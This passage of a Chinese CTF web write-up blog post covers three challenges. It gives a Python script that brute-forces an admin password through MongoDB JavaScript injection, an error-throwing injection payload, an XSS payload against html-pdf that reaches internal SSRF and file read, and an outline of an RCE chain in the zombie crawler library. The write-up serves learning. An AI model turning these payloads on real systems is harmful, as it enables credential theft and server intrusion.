class="hljs-string">&#x27;session&#x27;</span>:<span class="hljs-string">&#x27;s%3A9fJutdIDuXFuT3gcoAor1vkFD9Ikv2Tc.f3ROtzd9M%2Fzu%2BsRjUa60NMseu56cqBbZ5rqQEyk3Ghc&#x27;</span>&#125;<br>        data = &#123;<span class="hljs-string">&#x27;_csrf&#x27;</span>:<span class="hljs-string">&#x27;1zvGp4cd-G4wtUGigLyKgRmKIy-BWtBkFGH0&#x27;</span>,<br>                <span class="hljs-string">&#x27;token&#x27;</span>:<span class="hljs-string">&quot;cf87efe0c36a12aec113cd7982043573\&quot;||(this.username==\&quot;admin\&quot;&amp;&amp;this.password[&#123;&#125;]==\&quot;&#123;&#125;\&quot;)||\&quot;&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(j))&#125;<br>                <span class="hljs-comment"># &#x27;token&#x27;:&#x27;&quot;+hex_md5(this.password)&amp;&amp;this.password[&#123;&#125;]==&quot;&#123;&#125;&quot;&amp;&amp;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;==&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;.format(i,chr(j))&#125;</span><br>        res = s.post(url,data=data,cookies=cookies)<br><br>        <span class="hljs-comment"># print(res.text)</span><br>        <span class="hljs-comment"># print(&#x27;------------------&#x27;)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Found. Redirecting to&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            password +=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;---------&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><br></code></pre></div></td></tr></table></figure>
+
+<p>第二种payload是直接利用js的报错，因为MongoDB支持Javascript语法。所以可以用js语法去抛出内容是admin密码的异常</p>
+<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">_csrf=2PzwJX5n-Y1qH02TLkz3_JXa_OBn2hpgU2G8&amp;token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="hljs-string">&quot;||</span><br><span class="hljs-string">(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;</span>admin<br>#MongoError: Executor error during find command :: caused by :: Error: !@#&amp;@&amp;@efefef*@((@))grgregret3r : @:1:125 @:1:112<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h1><p>审计源码，发现一些点</p>
+<p><img src="https://img-blog.csdnimg.cn/f3aed98be9b64148a68d836e79a5fe3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里的<code>content</code>考虑xss，上面存在过滤，但可以用数组绕过，但是下面是通过<code>superuser</code>创建的数据库，无法用<code>/api/files/:id</code>访问</p>
+<p><img src="https://img-blog.csdnimg.cn/0cfee0eda2cd4c7b836a5e5970a5b21c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>通过查找<code>html-pdf</code>库发现它存在一个任意文件读取：</p>
+<blockquote>
+<p>html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(“GET”,”file:///etc/passwd”) will result in a PDF document with the contents of /etc/passwd.</p>
+</blockquote>
+<p>接着往下看，有一个提示，这里限制了需要本地才能访问，应该是xss打ssrf，然后进行<code>create</code>操作,结合文档可以用xhr操作</p>
+<p><img src="https://img-blog.csdnimg.cn/a4f8ca711a514b5b9cb41e60cdfd6900.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>最后这里明显可以看到存在文件读取。</p>
+<p><img src="https://img-blog.csdnimg.cn/c627162578714046893c6287b5fa1f08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里打ssrf的操作使用xhr来打，需要注意的是这里content的内容一定要url编码，被坑了很久。最后访问<code>/api/files/1234</code>即可</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">content[]=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">	<span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="javascript">	xhr.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/xhtml+xml&quot;</span>);</span><br><span class="javascript">	xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=/flag&amp;checksum=1234&quot;</span>, <span class="hljs-literal">true</span>);</span><br>    xhr.send();<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<h1 id="cralwer-z"><a href="#cralwer-z" class="headerlink" title="cralwer_z"></a>cralwer_z</h1><p>在<code>/profile</code>中，更新了<code>personalbucket</code>并且将valid设置成了false。</p>
+<p><img src="https://img-blog.csdnimg.cn/f0589ea4a2834814a83229c106e32c99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>进行了一个匹配，符合则跳转，这里好绕过直接?a=.oss-cn-beijing.ichunqiu.com就行</p>
+<p><img src="https://img-blog.csdnimg.cn/1492f0846ecd4d0390a9ff603cb71246.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>verify中将bucket更新为personalbucket，但是前提是valid要为true。</p>
+<p><img src="https://img-blog.csdnimg.cn/9bd7266f7c354e048d7739db42aa8c7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>最后在bucket中访问了设置的bucket，这里的爬虫使用了zombie库，这个库存在rce漏洞，搜索引擎真的很重要</p>
+<p>参考<a target="_blank" rel="noopener" href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p>
+<p><img src="https://img-blog.csdnimg.cn/47ff8e3d81bd48438119da3ab0c4785d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>思路很明显了，先在profile中随便传一个抓包获取token，然后将bucket设置成自己的url，然后提交将personalbucket更新，然后拿最开始获取的token访问verify来实现更新，最后访问bucket界面执行命令。这里buu上反弹不了shell不知道为啥。</p>
+<p><img src="https://img-blog.csdnimg.cn/5b52a4587fbc4b67ac9a29ad485c54be.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/18/2021-8-16-%E5%81%9A%E5%87%A0%E9%81%93%E9%A2%98/">
+                        <span class="hidden-mobile">做几道网鼎杯</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
